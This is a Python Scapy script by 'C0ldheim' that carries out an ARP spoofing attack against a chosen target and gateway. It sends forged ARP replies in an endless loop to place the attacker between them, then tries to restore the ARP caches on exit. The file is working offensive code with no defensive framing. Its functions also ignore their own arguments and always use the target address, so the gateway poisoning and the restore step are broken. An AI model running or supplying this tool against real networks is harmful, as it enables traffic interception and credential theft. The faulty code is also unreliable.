#!/usr/bin/env python3

#by C0ldheim

#Import Scapy
from scapy.all import *
import time
import argparse

L2Broadcast = "FF:FF:FF:FF:FF:FF"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", dest="target", type=str, required=True, help="Choose target IP")
    parser.add_argument("-g", dest="gateway", type=str, required=True, help="Choose the network gateway")
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Choose the interface")
    args = parser.parse_args()

    return args

args = get_arguments()


def get_mac(target, interface):
    arp_frame = ARP(pdst = args.target)
    broadcast = Ether(dst = L2Broadcast)
    arp_frame_broadcast = broadcast / arp_frame
    answered = srp(arp_frame_broadcast, iface=args.interface, timeout=2, verbose=0)[0]
 
    return answered[0][1].hwsrc
    
  
def poison(target, gateway, interface):
    packet = ARP(op = 2, pdst = args.target, hwdst = get_mac(args.target, interface), psrc = args.gateway)
    send(packet, iface=args.interface, verbose=0)
  

def restore(target, gateway, interface):
    target_mac = get_mac(target, interface)
    gateway_mac = get_mac(gateway, interface)
    arp_restore_frame = ARP(pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=gateway_mac)
    send(arp_restore_frame, iface=args.interface, verbose=0, count=5)
      
try:
    packets_count = 0
    while True:
        poison(args.target, args.gateway, args.interface)
        poison(args.gateway, args.target, args.interface)
        packets_count = packets_count + 2
        print("\r[*] Packets Sent " + str(packets_count), end ="")  
        time.sleep(2) 
  
except KeyboardInterrupt:
    print("\nDetected CTRL + C. Exiting.")
    restore(args.target, args.gateway, args.interface)
    restore(args.gateway, args.target, args.interface)
    print ("ARP Spoofing stopped")
